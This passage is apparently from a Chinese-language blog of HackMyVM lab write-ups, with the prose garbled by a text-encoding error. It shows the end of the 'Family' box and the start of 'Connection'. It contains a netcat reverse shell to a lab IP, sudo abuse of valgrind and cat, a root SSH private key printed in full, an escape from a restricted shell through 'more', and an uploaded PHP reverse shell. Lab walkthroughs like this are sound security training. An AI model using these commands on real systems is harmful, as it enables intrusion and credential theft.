class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> <span class="title class_">List</span> <span class="title class_">Manager</span><span class="symbol">:/var/list</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> <span class="title class_">Bug</span>-<span class="title class_">Reporting</span> <span class="title class_">System</span> (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> <span class="title class_">Time</span> <span class="title class_">Synchronization</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> <span class="title class_">Network</span> <span class="title class_">Management</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> <span class="title class_">Resolver</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">father:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:father</span>,,,<span class="symbol">:/home/father</span><span class="symbol">:/bin/bash</span></span><br><span class="line">systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> <span class="title class_">Core</span> <span class="title class_">Dumper</span><span class="symbol">:/</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">113</span><span class="symbol">:MySQL</span> <span class="title class_">Server</span>,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">mother:</span><span class="symbol">x:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span>,,,<span class="symbol">:/home/mother</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">baby:</span><span class="symbol">x:</span><span class="number">1002</span><span class="symbol">:</span><span class="number">1002</span><span class="symbol">:</span>,,,<span class="symbol">:/home/baby</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>
<p>åŒæ—¶fatheræ˜¯motherè¿™ä¸ªæ–‡ä»¶å¤¹çš„ç»„æˆå‘˜ï¼Œæœ‰å†™å…¥æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ªpyæ–‡ä»¶çš„åå¼¹shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">father<span class="variable">@family</span><span class="symbol">:/home/mother</span><span class="variable">$ </span>cat check.py </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;nc 192.168.112.83 1235 -e /bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nc -lp 1235  </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1001</span>(mother) gid=<span class="number">1001</span>(mother) groups=<span class="number">1001</span>(mother)</span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸå¼¹å›motherçš„shell</p>
<h2 id="mother"><a href="#mother" class="headerlink" title="mother"></a>mother</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mother<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> mother on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> mother may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (baby) <span class="symbol">NOPASSWD:</span> /usr/bin/valgrind</span><br></pre></td></tr></table></figure></div>
<p>motherå¯ä»¥ä¸ç”¨å¯†ç çš„å°±ç”¨babyç”¨æˆ·æ‰§è¡Œ&#x2F;usr&#x2F;bin&#x2F;valgrind<br>æ‰¾åˆ°valgrindçš„sudoåˆ©ç”¨æ–¹å¼ï¼Œè¿™ä¸ªå¯ä»¥ç›´æ¥å¾—åˆ°ä¸€ä¸ªbash<br>å¾—åˆ°babyçš„bash</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">mother<span class="meta">@family</span>:<span class="regexp">/usr/</span>bin$ sudo <span class="operator">-</span>u baby <span class="regexp">/usr/</span>bin<span class="regexp">/valgrind /</span>bin<span class="operator">/</span>bash </span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Memcheck</span>, a memory error detector</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Copyright</span> (<span class="type">C</span>) <span class="number">2002</span><span class="operator">-</span><span class="number">2017</span>, and <span class="type">GNU</span> <span class="type">GPL</span>&#x27;d, by <span class="type">Julian</span> <span class="type">Seward</span> et al.</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Using</span> <span class="type">Valgrind</span><span class="operator">-</span><span class="number">3.14</span>.<span class="number">0</span> and <span class="type">LibVEX</span>; rerun with <span class="operator">-</span>h <span class="keyword">for</span> copyright info</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> <span class="type">Command</span>: <span class="regexp">/bin/</span>bash</span><br><span class="line"><span class="operator">==</span><span class="number">1324</span><span class="operator">==</span> </span><br><span class="line">baby<span class="meta">@family</span>:<span class="regexp">/usr/</span>bin$ </span><br></pre></td></tr></table></figure></div>
<h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family</span><span class="symbol">:/usr/bin</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/cat</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°babyå¯ä»¥ç›´æ¥è¯»å–ä»»æ„æ–‡ä»¶äº† å…ˆå°è¯•è¯»å–flagï¼Œä½†æ˜¯å‘ç°æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family</span><span class="symbol">:/usr/bin</span><span class="variable">$ </span>sudo /usr/bin/cat /root/*.txt</span><br><span class="line">/usr/bin/<span class="symbol">cat:</span> <span class="string">&#x27;/root/*.txt&#x27;</span>: <span class="title class_">No</span> such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure></div>
<p>é‚£å°±å»è¯».ssh&#x2F;id_rsa å…ˆå»æ‹¿rootçš„ç§é’¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JULIA"><figure class="iseeu highlight /julia"><table><tr><td class="code"><pre><span class="line">baby<span class="meta">@family</span>:/usr/bin$ sudo cat /root/.ssh/id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAnbuWFqguL1RgxPF2kO1Fv1pC4BIFjxOp+ATX3k4WvuJyEdrcAFB5</span><br><span class="line">esn89B6TTKjBffemI/Ppb6/KQ+RXjgh5ZtEzxmRHhO9v9OAcXm76M/<span class="number">0</span>wmG49v+nD79y53b</span><br><span class="line">KFMjcsqwvHZXjn4b3Wk1myQTC2sP763UNfBfd5ZH9uViBqT3NZQNrmzV8V534fZsGeHsMf</span><br><span class="line">vvdbU5yRWlQIHypurKs5jKtwXnRJqpTnDkics2SBcqaL+<span class="number">1</span>ivwZIyNlBvdS7YZBoxRasLG5</span><br><span class="line"><span class="number">3</span>UKg4SIc9K3ujdYtCDYYSGjRxHQLIDRx1wGDo4Bn3jBbZsHqT6A3mpx367jx08WHlcy+eb</span><br><span class="line">hGyuXtnBrwAAA8CBizlZgYs5WQAAAAdzc2gtcnNhAAABAQCdu5YWqC4vVGDE8XaQ7UW/Wk</span><br><span class="line">LgEgWPE6n4BNfeTha+<span class="number">4</span>nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE</span><br><span class="line"><span class="number">72</span>/<span class="number">04</span>Bxebvoz/TCYbj2/<span class="number">6</span>cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf2</span><br><span class="line"><span class="number">5</span>WIGpPc1lA2ubNXxXnfh9mwZ4ewx++<span class="number">91</span>tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFy</span><br><span class="line">pov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfe</span><br><span class="line">MFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGvAAAAAwEAAQAAAQBKCYUXuXWETczmZJjM</span><br><span class="line">yjLU8N83If5t/ELp4gwZkvnmO5BjhSGDHEMJOcp8I+XsM8IvCJF5isHl5NPCLmpShvPFKS</span><br><span class="line">luVB+l7GXWwWNPiDP1N0EaK5TcgjOwYSD1SRhwS6mx1+OOY8QkF+GiZJXhN6ZpSiYiub7e</span><br><span class="line">pBzc6Vu3HZwJElUCvAuCxDbazc+RUT9VzH2BdQ3w1D66T8c3ruuRD8P86s0zf7/Bo/OmBi</span><br><span class="line">YeT/X3QcjyZTgmPjBR/m7nZNVUaDgWMCzIx2OecXX2bhdIVnpgVZVSq+EpidgvOPa/bjfQ</span><br><span class="line">AXB5vEuQ7lGz15Hx2isz5ai/zAKIGY33omnDT3f4ESvRAAAAgCkSIIvDtArb/<span class="number">6</span>jXQb57In</span><br><span class="line">aExbm6PurE05TEHj/COnGSjD0iWk6CFFs33ud1A4FX1ACEVkEh51KBukSGhOXHd/nAH56i</span><br><span class="line">pL4h5vmyt3JqLlilSkRju2oOH1I5edxIbTHD5aFHssD3l2OSaO4ax/h42BVp+Xr63FdDbS</span><br><span class="line">NV8qd9gYp7AAAAgQDM02e+O6t1J+X41VaGRuJTnYCfWXKA5KnmmDM5UKQHm4i0dXL9xWgE</span><br><span class="line">bBrFggoE2XsowMLRGOPe0ijuXOkgkpCeSB/rxmQ+Nn2x2O/H7yoIgl1IbpNIK6EZTaCebC</span><br><span class="line">lfdn0hK55BSl394ql0y4ns91E4XL0Xvc9RDlBvGF5BAd/KwwAAAIEAxSQf51F5oIYIvl4l</span><br><span class="line"><span class="number">9</span>y3g77L+VlV0Yg9iLunUT/km9abp9e2oTsNXN3e9IHja5GVxOUjhlBC8Yposlv/oaAApJu</span><br><span class="line">KC9XLqjqEmpo5gq61fG0HRPOkt1DKNuR3zIrWHot0DificHPyGISeu1/oR8tr9OR6Hmlvh</span><br><span class="line">+AY4rKYqqUj+hqUAAAALcm9vdEBmYW1pbHk=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># chmod 600 id_rsa                                  </span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh root@192.168.112.12 -i id_rsa</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">192.168</span><span class="number">.112</span><span class="number">.12</span> (<span class="number">192.168</span><span class="number">.112</span><span class="number">.12</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:c8APAkc6cpobBp5TlsyZ0NGBR6ZK9zbWY5binXumQhU.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;<span class="number">192.168</span><span class="number">.112</span><span class="number">.12</span>&#x27; (ED25519) to the list of known hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          oooo$$$$$$$$$$$$oooo</span><br><span class="line">                      oo$$$$$$$$$$$$$$$$$$$$$$$$o</span><br><span class="line">                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$</span><br><span class="line">   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$</span><br><span class="line">oo $ $ <span class="string">&quot;$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$<span class="variable">$o</span>       $$<span class="variable">$o</span>$<span class="variable">$o</span>$</span></span><br><span class="line"><span class="string">&quot;</span>$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$</span><br><span class="line">  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  <span class="string">&quot;&quot;&quot;$$$</span></span><br><span class="line"><span class="string">   &quot;$$$&quot;&quot;&quot;</span><span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     &quot;</span>$$$</span><br><span class="line">    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     <span class="string">&quot;$$<span class="variable">$o</span></span></span><br><span class="line"><span class="string">   o$$&quot;</span>   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o</span><br><span class="line">   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$<span class="string">&quot; &quot;</span>$$$$$$ooooo$$$$o</span><br><span class="line">  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$</span><br><span class="line">  $$$$$$$$<span class="string">&quot;$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$&quot;</span><span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"> &quot;</span><span class="string">&quot;&quot;&quot;       $$$$    &quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;      o$$$</span></span><br><span class="line"><span class="string">            &quot;$$<span class="variable">$o</span>     &quot;&quot;&quot;</span>$$$$$$$$$$$$$$$$$$<span class="string">&quot;$$&quot;</span>         $$$</span><br><span class="line">              $$$o          <span class="string">&quot;$$&quot;</span><span class="string">&quot;$$$$$$&quot;</span><span class="string">&quot;&quot;&quot;           o$$$</span></span><br><span class="line"><span class="string">               $$$<span class="variable">$o</span>                 oo             o$$$&quot;</span></span><br><span class="line"><span class="string">                &quot;$$$<span class="variable">$o</span>      o$$$$$<span class="variable">$o</span>&quot;$$$<span class="variable">$o</span>        o$$$$</span></span><br><span class="line"><span class="string">                  &quot;$$$$<span class="variable">$oo</span>     &quot;&quot;$$$<span class="variable">$o</span>$$$$<span class="variable">$o</span>   o$$$$&quot;&quot;  </span></span><br><span class="line"><span class="string">                     &quot;&quot;$$$$<span class="variable">$oooo</span>  &quot;$$<span class="variable">$o</span>$$$$$$$$$&quot;&quot;&quot;</span></span><br><span class="line">                        <span class="string">&quot;&quot;</span>$$$$$$$oo $$$$$$$$$$       </span><br><span class="line">                                <span class="string">&quot;&quot;&quot;&quot;$$$$$$$$$$$        </span></span><br><span class="line"><span class="string">                                    $$$$$$$$$$$$       </span></span><br><span class="line"><span class="string">                                     $$$$$$$$$$&quot;      </span></span><br><span class="line"><span class="string">                                      &quot;$$$&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--More--(99%)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯åœ¨é‡Œé¢æ²¡æ³•ç”¨å‘½ä»¤ï¼Œè€Œä¸”ä¸€ä¼šå°±æ–­å¼€è¿æ¥ã€‚<br>è¿™é‡Œçœ‹äº†wpçŸ¥é“è¦å»çœ‹çœ‹å…¬é’¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family</span><span class="symbol">:/usr/bin</span><span class="variable">$ </span>sudo cat /root/.ssh/authorized_keys</span><br><span class="line">command=<span class="string">&quot;bash ~/troll.sh&quot;</span> ssh-rsa <span class="title class_">AAAAB3NzaC1yc2EAAAADAQABAAABAQCdu5YWqC4vVGDE8XaQ7UW</span>/<span class="title class_">WkLgEgWPE6n4BNfeTha</span>+<span class="number">4</span>nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE72/<span class="number">04</span>Bxebvoz/<span class="title class_">TCYbj2</span>/<span class="number">6</span>cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf25WIGpPc1lA2ubNXxXnfh9mwZ4ewx++<span class="number">91</span>tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFypov7WK/<span class="title class_">BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfeMFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGv</span> root<span class="variable">@family</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå‘ç°å…¬é’¥ä¸­æ‰§è¡Œäº†troll.shæ–‡ä»¶ï¼Œå»çœ‹çœ‹è¿™ä¸ªè„šæœ¬é‡Œé¢æœ‰ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">baby@family:<span class="regexp">/usr/</span>bin$ sudo cat <span class="regexp">/root/</span>troll.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">export TERM=xterm</span><br><span class="line">more <span class="regexp">/root/</span>welcome.txt</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°è¿™é‡Œä½¿ç”¨äº†moreå»è¯»å–äº†welcome.txtï¼Œåœ¨gofobinsä¸­æ‰¾åˆ°è·³å‡ºè¿™ä¸ªå—é™shellçš„åŠæ³•<br><img src="https://pic1.imgdb.cn/item/67ad867ad0e0a243d4fec512.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">!<span class="regexp">/bin/bash</span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°rootshell  ç»“æŸ</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦åˆ°äº†wordpressåœ¨å¯ä»¥å®‰è£…æ’ä»¶çš„æ—¶å€™çš„é€šæ€æ–¹æ³•ï¼Œå®‰è£…WPTermè¿™ä¸ªæ’ä»¶æ¥åå¼¹shellã€‚<br>åœ¨ææƒè¿‡ç¨‹ä¸­ æŸ¥çœ‹.bash_historyæ‰¾åˆ°æ•æ„Ÿæ–‡ä»¶ä½ç½®<br>æœ€åäº†è§£äº†valgrindå¯ä»¥è¿è¡Œ&#x2F;bin&#x2F;bashç›´æ¥å¾—åˆ°ä¸€ä¸ªbash<br>sshç™»å½•æœ‰é—®é¢˜çš„æ—¶å€™ï¼Œçœ‹çœ‹å…¬é’¥æ–‡ä»¶ï¼Œ~&#x2F;authorized_keys<br>å­¦ä¹ äº†moreæŒ‡ä»¤è·³å‡ºå—é™bashçš„æ–¹æ³• !&#x2F;bin&#x2F;bash<br>è¿™é‡Œå†äº†è§£ä¸€äº›moreå¦‚æœæœ‰sudoæƒé™çš„ææƒæ–¹å¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">TERM= <span class="built_in">sudo</span> more /etc/profile</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Connection</title>
    <url>/posts/10052.html</url>
    <content><![CDATA[<p>HMV-Connectioné¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f7d0e0a243d4f878cd.png"></p>
<h1 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h1><p>æ— æ³•è·å–ip åœ¨å¼€å§‹ä¹‹å‰è¦å…ˆè¿›å…¥æ‹¯æ•‘è€…æ¨¡å¼ä¸­ä¿®æ”¹ ç½‘å¡ä¿¡æ¯</p>
<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://pic1.imgdb.cn/item/679a3d3bd0e0a243d4f879fa.png" alt="|750"><br>ç«¯å£æœ‰4ä¸ª  æœ‰http  ssh è¿˜æœ‰smbæœåŠ¡ è¿™ä¸ªæœåŠ¡åˆšå­¦åˆ° æ˜¯ä¸€ä¸ªæ–‡ä»¶å…±äº«çš„æœåŠ¡ </p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>è¿™é‡Œä¸»è¦å…ˆè€ƒè™‘httpå’Œ22ç«¯å£<br>ç”¨dirsearchå‘ç°æ²¡æœ‰å…¶ä»–æœ‰ç”¨çš„ç•Œé¢   80ç«¯å£æ˜¯ä¸€ä¸ªé»˜è®¤çš„indexç•Œé¢æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯<br>ssh ä¹Ÿä¸èƒ½ç›´æ¥ç™»å½•ä¸Šå»  éœ€è¦å¯†ç <br>æ‰€ä»¥è€ƒè™‘è¿™ä¸ªsmbæœåŠ¡<br>ç”¨enum4linux -S åˆ—ä¸¾å‡ºsmbå…±äº«èµ„æº<br><img src="https://pic1.imgdb.cn/item/679a3d40d0e0a243d4f879fb.png"><br>ç™»å½•åˆ°share    â€“ åˆ©ç”¨smbclient  -N  åŒ¿åç™»å½•  <code>smbclient -N \\\\192.168.240.237\\share</code><br>è¿™é‡Œè¦ç”¨åæ–œæ è½¬ä¹‰<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879fe.png"><br>ç™»å½•è¿›æ¥ä¹‹åä¹Ÿåªçœ‹åˆ°åªæœ‰ä¸€ä¸ªhtmlæ–‡ä»¶     ç„¶åæˆ‘ä»¬ä»æœ¬åœ°ä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„æ–‡ä»¶<br><code>put php-reverse-shell.php</code>  å› ä¸ºshareè¿™ä¸ªæ–‡ä»¶å¤¹åªæœ‰åªè¯»æƒé™æ‰€ä»¥è¿›åˆ°htmlä¸­ä¸Šä¼ <br>ä¸Šä¼ æˆåŠŸå åœ¨æœ¬åœ°ç›‘å¬  webç«¯è¿›å…¥è¿™ä¸ªphpæ–‡ä»¶  ç„¶åå°±å¯ä»¥è·å¾—shell</p>
